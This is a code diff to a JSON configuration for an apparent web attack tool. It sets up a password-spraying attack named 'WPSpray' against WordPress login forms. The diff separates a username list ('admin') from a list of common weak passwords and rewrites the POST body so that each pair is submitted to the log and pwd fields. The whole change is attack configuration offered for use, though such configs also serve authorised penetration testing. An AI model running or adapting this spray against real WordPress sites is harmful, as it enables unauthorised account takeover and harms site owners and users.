@@ -1,11 +1,18 @@
 {
     "Id": "WPSpray",
     "Mode": "Attack",
-    "PayloadSet": {
-        "Id": "FUZZ",
-        "File": "",
-        "List": ["admin"]
-    },
+    "PayloadSet": [
+        {
+            "Id": "FUZZU",
+            "File": "",
+            "List": ["admin"]
+        },
+        {
+            "Id": "FUZZP",
+            "File": "",
+            "List": ["admin", "Password@123", "Welcome@123"]
+        }
+    ],
     "RequestTemplate": {
         "Method": "POST",
         "UrlTemplate": "BASE",
@@ -13,7 +20,7 @@
             "User-Agent": "DEFAULT",
             "Content-Type": "application/x-www-form-urlencoded"
         },
-        "Body": ["log=FUZZ&pwd=FUZZ&wp-submit=Log+In&testcookie=1"]
+        "Body": ["log=FUZZU&pwd=FUZZP&wp-submit=Log+In&testcookie=1"]
     },
     "ResponseAction": {
         "FactConditions": [
